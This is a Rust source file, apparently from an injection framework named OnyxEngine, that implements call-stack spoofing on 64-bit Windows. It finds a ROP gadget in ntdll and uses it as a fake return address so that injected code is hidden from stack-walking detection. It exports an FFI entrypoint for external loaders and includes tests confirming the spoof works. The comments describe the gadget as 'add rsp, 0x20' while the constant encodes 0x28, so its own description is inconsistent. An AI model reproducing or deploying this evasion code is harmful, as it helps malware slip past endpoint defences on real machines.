#![cfg(all(windows, target_arch = "x86_64"))]

//! Call-stack spoofing para threads/invocacoes injetadas pelo OnyxEngine.
//!
//! A tecnica resolve em runtime um "gadget" de ROP dentro da `.text` da
//! `ntdll.dll` (`add rsp, 0x20 ; ret`, bytes `48 83 C4 20 C3`) e usa esse
//! endereco como *fake return address* da funcao alvo. Qualquer caminho de
//! deteccao que inspecione o primeiro frame acima da funcao chamada
//! (`RtlCaptureStackBackTrace`, `StackWalk64`, scan de pilha heuristico) vai
//! encontrar codigo da ntdll ao inves da nossa DLL, mascarando a origem.
//!
//! API publica:
//! * [`SpoofedCall`] / [`call_spoofed`] – helper de alto nivel em Rust.
//! * [`onyx_callstack_spoof_call`] – entrypoint FFI (`extern "C"`).

use core::ffi::c_void;
use core::mem::size_of;
use core::slice;
use std::sync::OnceLock;

use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
};

pub mod stub;

use stub::onyx_callstack_gate;

/// Bytes do gadget `add rsp, 0x28 ; ret` usado como fake return frame.
pub const GADGET_BYTES: [u8; 5] = [0x48, 0x83, 0xC4, 0x28, 0xC3];

/// Informacoes do gadget resolvido em runtime.
#[derive(Debug, Clone, Copy)]
pub struct GadgetInfo {
    pub ntdll_base: *const u8,
    pub ntdll_size: usize,
    pub gadget: *const u8,
}

unsafe impl Send for GadgetInfo {}
unsafe impl Sync for GadgetInfo {}

static GADGET: OnceLock<GadgetInfo> = OnceLock::new();

/// Resolve (ou devolve o cache de) o gadget dentro da ntdll.
pub fn gadget_info() -> &'static GadgetInfo {
    GADGET.get_or_init(|| unsafe { resolve_gadget().expect("gadget nao encontrado em ntdll") })
}

/// Encontra o gadget `add rsp, 0x20 ; ret` dentro da `.text` da ntdll.
unsafe fn resolve_gadget() -> Option<GadgetInfo> {
    let base = GetModuleHandleA(c"ntdll.dll".as_ptr() as *const u8) as *const u8;
    if base.is_null() {
        return None;
    }

    let dos = &*(base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }
    let nt = &*(base.add(dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    if nt.Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    let module_size = nt.OptionalHeader.SizeOfImage as usize;

    let sections = slice::from_raw_parts(
        (nt as *const IMAGE_NT_HEADERS64 as *const u8).add(size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER,
        nt.FileHeader.NumberOfSections as usize,
    );

    for s in sections {
        if &s.Name[..5] != b".text" {
            continue;
        }
        let va = base.add(s.VirtualAddress as usize);
        let size = s.Misc.VirtualSize as usize;
        let bytes = slice::from_raw_parts(va, size);
        if let Some(off) = find_gadget(bytes) {
            return Some(GadgetInfo {
                ntdll_base: base,
                ntdll_size: module_size,
                gadget: va.add(off),
            });
        }
    }
    None
}

fn find_gadget(bytes: &[u8]) -> Option<usize> {
    let needle = &GADGET_BYTES;
    bytes
        .windows(needle.len())
        .position(|w| w == needle)
}

/// Builder-style wrapper. Util quando o chamador quer organizar args
/// nomeadamente antes do despacho.
pub struct SpoofedCall {
    target: *const u8,
    args: [usize; 4],
}

impl SpoofedCall {
    pub fn new(target: *const u8) -> Self {
        Self {
            target,
            args: [0; 4],
        }
    }

    pub fn arg(mut self, idx: usize, v: usize) -> Self {
        assert!(idx < 4, "SpoofedCall aceita no maximo 4 args");
        self.args[idx] = v;
        self
    }

    pub unsafe fn invoke(self) -> usize {
        call_spoofed(
            self.target,
            self.args[0],
            self.args[1],
            self.args[2],
            self.args[3],
        )
    }
}

/// Chama `target_fn(a1, a2, a3, a4)` com a pilha spoofada.
///
/// Retorna o valor devolvido pelo alvo (`rax` apos o retorno).
pub unsafe fn call_spoofed(
    target_fn: *const u8,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> usize {
    let info = gadget_info();
    onyx_callstack_gate(target_fn, info.gadget, a1, a2, a3, a4)
}

/// Entrypoint FFI consumido por loaders/DLLs externos.
///
/// `args_count` tem que ser `<= 4`. Casos com mais args devem usar a crate
/// `syscalls-indirect` diretamente ou estender esta rotina para contemplar
/// o layout de stack-args.
///
/// Retorna 0 em sucesso, codigos negativos nos erros.
#[no_mangle]
pub unsafe extern "C" fn onyx_callstack_spoof_call(
    target_fn: *const u8,
    args_ptr: *const usize,
    args_count: usize,
    out_result: *mut usize,
) -> i32 {
    if target_fn.is_null() {
        return -1;
    }
    if args_count > 4 {
        return -2;
    }

    let mut args = [0usize; 4];
    if !args_ptr.is_null() {
        for i in 0..args_count {
            args[i] = *args_ptr.add(i);
        }
    }

    let ret = call_spoofed(target_fn, args[0], args[1], args[2], args[3]);
    if !out_result.is_null() {
        *out_result = ret;
    }
    0
}

/// Preenche `out` com os frames capturados por `RtlCaptureStackBackTrace`.
///
/// Expose como helper para testes/consumidores. Retorna a quantidade de
/// frames preenchidos.
pub unsafe fn capture_backtrace(skip: u32, out: &mut [*mut c_void]) -> u32 {
    windows_sys::Win32::System::Diagnostics::Debug::RtlCaptureStackBackTrace(
        skip,
        out.len() as u32,
        out.as_mut_ptr(),
        core::ptr::null_mut(),
    ) as u32
}

/// Retorna a base do modulo que contem `addr`, ou NULL se nao houver.
pub unsafe fn module_base_of(addr: *const c_void) -> *const u8 {
    use windows_sys::Win32::System::LibraryLoader::{
        GetModuleHandleExA, GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
    };
    let mut hmod: windows_sys::Win32::Foundation::HMODULE = 0;
    let ok = GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        addr as *const u8,
        &mut hmod,
    );
    if ok == 0 {
        core::ptr::null()
    } else {
        hmod as *const u8
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn gadget_discovered() {
        let info = gadget_info();
        assert!(!info.ntdll_base.is_null());
        assert!(info.ntdll_size > 0);
        unsafe {
            let bytes = core::slice::from_raw_parts(info.gadget, GADGET_BYTES.len());
            assert_eq!(bytes, &GADGET_BYTES, "gadget bytes mismatch");
            // dentro do range da ntdll
            let g = info.gadget as usize;
            let b = info.ntdll_base as usize;
            assert!(g >= b && g < b + info.ntdll_size);
        }
    }

    /// Target de teste: captura seu proprio callstack e devolve, via
    /// ponteiros, (1) a quantidade de frames (2) o endereco do primeiro
    /// frame de retorno (frame[1], acima da propria funcao).
    unsafe extern "C" fn capture_target(
        frames_out: *mut *mut c_void,
        frames_cap: usize,
        count_out: *mut u32,
        _unused: usize,
    ) -> usize {
        let out = core::slice::from_raw_parts_mut(frames_out, frames_cap);
        let n = capture_backtrace(0, out);
        if !count_out.is_null() {
            *count_out = n;
        }
        0xDEAD_BEEF
    }

    fn self_module_base() -> *const u8 {
        unsafe {
            let addr = tests::capture_target as *const c_void;
            module_base_of(addr)
        }
    }

    #[test]
    fn baseline_frame_is_our_module() {
        // Chamada normal (sem spoof): o frame acima do target deve estar
        // dentro do modulo da propria crate (exe de teste).
        let mut frames = [core::ptr::null_mut::<c_void>(); 16];
        let mut n = 0u32;
        let _ = unsafe {
            capture_target(
                frames.as_mut_ptr(),
                frames.len(),
                &mut n,
                0,
            )
        };
        assert!(n >= 2, "callstack muito curto: {}", n);

        let test_mod = self_module_base() as usize;
        let frame1 = unsafe { module_base_of(frames[1]) } as usize;
        assert_eq!(
            frame1, test_mod,
            "sem spoof o frame[1] deveria estar no modulo de teste"
        );
    }

    #[test]
    fn spoofed_frame_points_into_ntdll() {
        let mut frames = [core::ptr::null_mut::<c_void>(); 16];
        let mut n = 0u32;
        let ret = unsafe {
            call_spoofed(
                capture_target as *const u8,
                frames.as_mut_ptr() as usize,
                frames.len(),
                &mut n as *mut u32 as usize,
                0,
            )
        };
        assert_eq!(ret, 0xDEAD_BEEF, "target retornou valor errado");
        assert!(n >= 2, "callstack muito curto: {}", n);

        let ntdll_base = gadget_info().ntdll_base as usize;
        let ntdll_end = ntdll_base + gadget_info().ntdll_size;
        let frame1 = frames[1] as usize;
        assert!(
            frame1 >= ntdll_base && frame1 < ntdll_end,
            "frame[1]={:#x} nao esta em ntdll [{:#x}..{:#x})",
            frame1,
            ntdll_base,
            ntdll_end
        );

        // alem disso, frame[1] NAO pode pertencer ao modulo de teste
        let test_mod = self_module_base() as usize;
        let frame1_mod = unsafe { module_base_of(frames[1]) } as usize;
        assert_ne!(
            frame1_mod, test_mod,
            "frame[1] ainda esta no modulo de teste apos spoof"
        );
    }

    #[test]
    fn ffi_entrypoint_round_trip() {
        unsafe extern "C" fn t(a1: usize, a2: usize, a3: usize, a4: usize) -> usize {
            a1.wrapping_add(a2)
                .wrapping_add(a3)
                .wrapping_add(a4)
                .wrapping_add(0x1234)
        }
        let args = [10usize, 20, 30, 40];
        let mut out: usize = 0;
        let rc = unsafe {
            onyx_callstack_spoof_call(
                t as *const u8,
                args.as_ptr(),
                args.len(),
                &mut out,
            )
        };
        assert_eq!(rc, 0);
        assert_eq!(out, 10 + 20 + 30 + 40 + 0x1234);
    }

    #[test]
    fn ffi_entrypoint_rejects_too_many_args() {
        let args = [0usize; 8];
        let mut out: usize = 0;
        let rc = unsafe {
            onyx_callstack_spoof_call(
                0xDEADBEEF as *const u8,
                args.as_ptr(),
                args.len(),
                &mut out,
            )
        };
        assert_eq!(rc, -2);
    }
}
